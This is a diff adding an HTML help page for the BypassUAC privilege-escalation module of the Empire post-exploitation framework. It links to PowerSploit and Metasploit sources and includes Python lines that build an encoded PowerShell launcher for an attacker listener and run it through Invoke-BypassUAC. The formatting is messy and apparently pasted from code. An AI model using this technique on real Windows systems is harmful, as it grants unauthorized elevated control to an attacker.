@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>BypassUAC</title>
+</head><body>Runs a BypassUAC attack to escape from a medium integrity process "<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "to a high integrity process. This attack was originally discovered by Leo Davidson. "<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Empire uses components of MSF's bypassuac injection implementation as well as "<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp; &nbsp;"an adapted version of PowerSploit's Invoke--Shellcode.ps1 script for backend lifting."</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Does not need Admin<br/>
+<br/>
+https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke--Shellcode.ps1',<br/>
+'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/bypassuac_injection.rb',<br/>
+'https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/bypassuac_injection/dll/src',<br/>
+'http://www.pretentiousname.com/<br/>
+<br/>
+moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-BypassUAC.ps1<br/>
+launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)<br/>
+scriptEnd = "Invoke-BypassUAC -Command \"%s\"" % (launcher)</body></html>
